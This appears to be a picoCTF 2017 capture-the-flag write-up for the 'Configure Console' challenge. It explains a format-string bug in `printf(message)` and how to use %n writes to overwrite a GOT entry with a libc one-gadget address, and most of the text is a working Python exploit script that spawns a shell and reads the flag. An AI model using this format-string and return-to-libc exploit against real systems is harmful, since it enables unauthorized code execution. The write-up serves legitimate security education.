# Configure Console - 125 Points
In order to configure the login messsage for all the users on the system, you've been given access to a configuration console. See if you can get a shell on shell2017.picoctf.com:27124. [console](https://webshell2017.picoctf.com/static/fc50965bf06c222d7b6d30aac8db296e/console) [Source](https://webshell2017.picoctf.com/static/fc50965bf06c222d7b6d30aac8db296e/config-console.c)

## Write-Up
This code was fine except for one line: `printf(message);` which prints out the message, but this is suceptible to string format. I were able to place custom format specifiers to read (and also write to stack). `%s` simply prints a string with a pointer. Hmm... that might help me to read memory... from a pointer. `%n` writes to an integer *pointer* the number of characters written. Hmm... I could control the number of characters written and that would let me write an arbirary number to a pointer --- given, I can't write a large integer, but it turns out I don't need to write large numbers. 

My strategy was to place the addresses I would need to write to and read from within the buf pointer towards the end of the buffer, and perhaps write over *some* address so that I could have the code jump to what I want it to do. However, both ASLR and W^X (you can't simulaneously write to and excute a section of memory) are enabled, so I couldn't just write any shellcode to execute.

However, I could do a return-to-libc attack. Most times, the `libc` library (the standard c library) functions have a randomized address so that I couldn't easily return to any arbitrary function I want. When a program needs to access a library function (such as `printf` or `exit`) they would first jump to a `PLT` stub code, which links the library function to this program, and places the resulting address of the library function into the `GOT` table. What I need to do is first run the printf attack to locate the base address for `libc` and then the second printf attack I will try and get shell. 

There are certain spots in a `libc` library that would directly give you shell (known as "gadgets", I used this [site](https://david942j.blogspot.com/2017/02/project-one-gadget-in-glibc.html) to help find required constraints to run execve correctly). There happens to be one location in `libc` that only requires me to set an address in stack to `NULL` in 64-bit libc. To confirm this location in the version within the shell, I first ran the command `objdump -s /lib/x86_64-linux-gnu/libc.so.6 | grep "/bin/sh"` to find the address of this sacred `/bin/sh` potentials. Then I searched for this address one by one, and found the offset to be 0x86187. This is the python script I used for this challenge (after much toying around with the code).

```python
import os, sys
from struct import pack, unpack
import shlex, subprocess
from subprocess import Popen, PIPE

buffAddr = 0

def exploit(inject, input, output):
  global buffAddr
  inject = sorted(inject, key=lambda x: x[0])
  
  exploit = ''
  addrStr = ''
  
  MAX_SPACE = 200
  
  if buffAddr == 0:
    base = '%c' * 11 + '\xfe\xfe' + '%022llx' + '%c' * (2 + MAX_SPACE / 8) # FIX THIS
    charsWritten = 41 + MAX_SPACE / 8
  else:
    base = '%c' * (14 + MAX_SPACE / 8)
    charsWritten = 18 + MAX_SPACE / 8
  
  readAddrs = 0
  blankChars = 0
  for set in inject:
    value = set[0]
    addr = set[1]
    if value != -1:
      chg = value - charsWritten
      if (chg):
        addrStr += ' ' + '\x00'*7
        exploit += '%' + str(chg) + 'c'
        charsWritten = value
        blankChars += chg
      addrStr += pack('<q', addr)
      exploit += '%n'
    else:
      addrStr += pack('<q', addr)
      exploit += '%s'
      charsWritten += 6
      readAddrs += 1
  
  
  space = len(exploit) + len(base)
  if space > MAX_SPACE:
    raise ValueError
  exploit += ' ' * (MAX_SPACE - space)
  blankChars += MAX_SPACE - space
  
  output.write('exi ' + base + '\xff'*4 + exploit + addrStr + "\n")
  
  if buffAddr == 0:
    #read for \xfe\xfe
    c = input.read(1)
    while c != "":
      if c == "\xfe":
        c = input.read(1)
        if (c == "\xfe"):
          break
      c = input.read(1)

    if c == "":
      raise ValueError
    buffAddr = int(input.read(22), 16)

  #read for \xff\xff\xff\xff marker
  c = input.read(1)
  while c != "":
    if c == "\xff":
      for i in range(3):
        c = input.read(1)
        if (c != "\xff"):
          break
      else:
        break
    c = input.read(1)
  
  if c == "": 
    raise ValueError
  
  #read values
  values = []
  for i in range(readAddrs):
    values += [unpack("<q", input.read(6) + "\x00\x00")[0]]
  
  #skip blank characters
  while (blankChars < 8192):
    input.read(blankChars)
    blankChars -= 8192
  input.read(blankChars)
  
  return values

p = Popen("./console 333", shell=True, stdout=PIPE, stdin=PIPE)

#first is value, next is address to write to.
inject1 = [[0x4009bd, 0x601258], [-1, 0x601220]]
val = exploit(inject1, p.stdout, p.stdin)

val[0] += 0x86187
high = val[0] >> 32
low = val[0] & 0xffffffff
print("Received address: " + hex(val[0]))

buffAddr -= 0x460 # Since we have it call loop function and then set_exit_message
                  # stack has been pushed down. Get address of other buffer
inject2 = [[low, 0x601258], [high, 0x60125c]]
for addr in range(buffAddr + 0x2c, buffAddr + 0x26 - 2, -2):
  inject2 += [[0xfff, addr]]


exploit(inject2, p.stdout, p.stdin)

p.stdin.write("cat flag.txt"); #can i haz flag pls
c = p.stdout.read(1)
while c != "":
  sys.stdout.write(c)
  sys.stdout.flush()
  c = p.stdout.read(1)
```

## Helpful Resources
[https://david942j.blogspot.com/2017/02/project-one-gadget-in-glibc.html](https://david942j.blogspot.com/2017/02/project-one-gadget-in-glibc.html)